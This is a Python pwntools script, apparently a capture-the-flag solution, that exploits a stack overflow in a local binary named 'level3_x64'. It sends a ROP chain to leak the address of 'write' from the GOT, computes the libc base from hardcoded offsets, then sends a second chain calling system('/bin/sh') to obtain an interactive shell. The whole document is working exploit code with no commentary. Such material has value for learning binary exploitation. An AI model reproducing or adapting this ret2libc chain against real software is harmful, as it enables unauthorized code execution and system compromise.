# coding:utf-8

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('level3_x64')
elf = ELF('level3_x64')
#gdb.attach(p)

padding = 'a' * 0x80
fake_ebp = 'k1ose2jo'
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']
pop_rdi_ret = 0x04006b3
pop_rsi_r15_ret = 0x04006b1
ret_addr = 0x400499

payload1 = padding + fake_ebp + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
p.recvuntil('Input:\n')
p.send(payload1)

write_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
print('write_addr: ', hex(write_addr))
pause()
libc_base = write_addr - 0xef3b0
system_addr = libc_base + 0x46590
str_bin_sh = libc_base + 0x180543

payload2 = padding + fake_ebp + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system_addr)
p.recvuntil('Input:\n')
p.send(payload2)

p.interactive()

